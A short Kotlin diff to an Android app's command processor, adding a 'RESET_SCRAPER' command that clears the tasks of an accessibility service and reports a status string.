@@ -334,6 +334,15 @@ object CommandProcessor {
                         errorMsg = "Accessibility service is offline."
                     }
                 }
+                "RESET_SCRAPER" -> {
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
+                        service.resetAllTasks()
+                        status = "SCRAPER_QUEUE_PURGED"
+                    } else {
+                        status = "FAILED (SERVICE_OFF)"
+                    }
+                }
                 "GET_LOGS" -> {
                     val logs = DebugLogger.getLogs()
                     val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
